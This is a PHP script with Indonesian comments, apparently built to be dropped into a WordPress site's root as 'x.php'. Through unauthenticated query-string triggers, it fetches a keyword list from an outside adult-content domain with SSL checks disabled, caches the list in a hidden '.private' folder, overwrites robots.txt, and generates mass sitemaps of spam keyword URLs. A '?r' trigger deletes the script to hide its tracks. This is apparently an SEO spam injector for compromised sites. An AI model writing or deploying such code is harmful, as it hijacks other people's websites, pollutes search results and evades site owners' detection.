<?php
// File: x.php (Simpan di root WordPress Anda)

@set_time_limit(300); // Beri waktu 5 menit untuk semua operasi

// 1. Dapatkan query string
$query = $_SERVER['QUERY_STRING'];


// --- [DEPENDENSI YANG DISALIN] ---
// --- Diperlukan untuk Sitemap & Robots ---

// Definisi path JSON (dari index-client.php)
$wp_json_path = dirname(__FILE__) . '/.private/active_seo_data.json';

/**
 * Fungsi fetchFromUrl (dari index-endpoint.php)
 * Diperlukan untuk logika Sitemap dan download JSON.
 */
function fetchFromUrl($url, $default = []) { 
    $content = false;
    if (ini_get('allow_url_fopen')) {
        $content = @file_get_contents($url);
    }
    if ($content === false && function_exists('curl_version')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $content = curl_exec($ch);
        curl_close($ch);
    }
    $data = json_decode($content, true);
    if (is_array($data) && !empty($data)) {
        return $data;
    }
    return $default;
}

// --- [AKHIR DEPENDENSI] ---


// --- [TUGAS 1: GENERATOR ROBOTS] ---
if ($query === 'robots' || $query === 'robots.txt') {
    
    $robots_file = 'robots.txt';
    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
    $domain = $_SERVER['HTTP_HOST'];
    
    $base_path = ''; 
    $base_url = $protocol . $domain . $base_path; 
    
    $sitemap_url = $base_url . '/sitemap.xml';
    
    $robots_content = "User-agent: *\nAllow: /\n\nSitemap: " . $sitemap_url;
    
    file_put_contents(dirname($_SERVER['SCRIPT_FILENAME']) . '/' . $robots_file, $robots_content);
    
    header('Content-Type: text/plain');
    echo "robots.txt generated successfully.\n";
    echo $robots_content;
    exit;
}


// --- [TUGAS 2: GENERATOR SITEMAP] ---
if ($query === 'sitemap') {
    
    $content_data = fetchFromUrl($wp_json_path, []);
    $keywords = $content_data ? array_keys($content_data) : [];
    $total_keywords = count($keywords);
    
    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
    $domain = $_SERVER['HTTP_HOST'];

    $base_path = ''; 
    $base_url = $protocol . $domain . $base_path; 
    $now = date('Y-m-d\TH:i:s+07:00'); 
    $urls_per_map = 50000;
    
    $num_maps = ceil($total_keywords / $urls_per_map);
    if ($num_maps == 0) $num_maps = 1;
    
    $files_created = [];
    $server_path = dirname($_SERVER['SCRIPT_FILENAME']);

    // 1. BUAT SEMUA SUB-SITEMAP (Anak)
    for ($i = 1; $i <= $num_maps; $i++) {
        $sitemap_file = 'sitemap-' . $i . '.xml';
        $sitemap_path = $server_path . '/' . $sitemap_file;
        
        $offset = ($i - 1) * $urls_per_map;
        $keywords_chunk = array_slice($keywords, $offset, $urls_per_map);

        $xml = '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL;
        $xml .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;

        foreach ($keywords_chunk as $keyword) {
            $url = $base_url . '/' . htmlspecialchars(urlencode($keyword));
            $xml .= '  <url>' . PHP_EOL;
            $xml .= '    <loc>' . $url . '</loc>' . PHP_EOL;
            $xml .= '    <lastmod>' . $now . '</lastmod>' . PHP_EOL;
            $xml .= '  </url>' . PHP_EOL;
        }
        $xml .= '</urlset>' . PHP_EOL;
        
        file_put_contents($sitemap_path, $xml);
        $files_created[] = $sitemap_file;
    }

    // 2. BUAT SITEMAP INDEX (Induk)
    $sitemap_file = 'sitemap.xml';
    $sitemap_path = $server_path . '/' . $sitemap_file;

    $xml = '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL;
    $xml .= '<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;
    for ($i = 1; $i <= $num_maps; $i++) {
        $map_url = $base_url . '/sitemap-' . $i . '.xml';
        $xml .= '  <sitemap>' . PHP_EOL;
        $xml .= '    <loc>' . htmlspecialchars($map_url) . '</loc>' . PHP_EOL;
        $xml .= '    <lastmod>' . $now . '</lastmod>' . PHP_EOL;
        $xml .= '  </sitemap>' . PHP_EOL;
    }
    $xml .= '</sitemapindex>' . PHP_EOL;
    
    file_put_contents($sitemap_path, $xml);
    $files_created[] = $sitemap_file;
    
    // 3. Tampilkan laporan sukses
    header('Content-Type: text/plain');
    echo "PROSES GENERATE SITEMAP SELESAI.\n\n";
    echo "Total " . count($files_created) . " file telah dibuat/diperbarui:\n";
    foreach ($files_created as $file) {
        echo "- " . $file . "\n";
    }
        
    exit; 
}


// --- [TUGAS 3: DOWNLOAD JSON] ---
if (!empty($query) && preg_match('/\.json$/i', $query)) {
    
    $json_to_download = $query;
    $remote_json_url = 'https://player.javpornsub.net/content/' . $json_to_download;

    $cache_dir = dirname(__FILE__) . '/.private';
    $local_save_path = $cache_dir . '/active_seo_data.json'; 

    if (!is_dir($cache_dir)) {
        if (!@mkdir($cache_dir, 0755, true)) {
            die('Error: Gagal membuat folder .private. Periksa izin "write" di folder root Anda.');
        }
    }

    $code = fetchFromUrl($remote_json_url, false);

    header('Content-Type: text/plain');
    if ($code !== false && !empty($code)) {
        // [PERUBAHAN] Menyimpan data yang sudah di-decode sebagai string JSON
        @file_put_contents($local_save_path, json_encode($code)); 
        
        echo "NOTIFIKASI: BERHASIL.\n\n";
        echo "File '" . $json_to_download . "' telah diunduh.\n";
        echo "Disimpan secara LOKAL di: " . $local_save_path . "\n";

    } else {
        echo "NOTIFIKASI: GAGAL.\n\n";
        echo "Gagal mengunduh file dari: " . $remote_json_url . "\n";
    }
    exit;
}


// --- [TUGAS 4: HAPUS SCRIPT (Trigger: ?r)] ---
if ($query === 'r') {
    header('Content-Type: text/plain');
    if (@unlink(__FILE__)) {
        echo "File 'x.php' ini telah berhasil dihapus.";
    } else {
        echo "GAGAL menghapus 'x.php'. Periksa izin file.";
    }
    exit;
}


// --- [FALLBACK ERROR] ---
die('Error: Tentukan query. Contoh: x.php?file.json, x.php?robots, x.php?sitemap, atau x.php?r');

?>
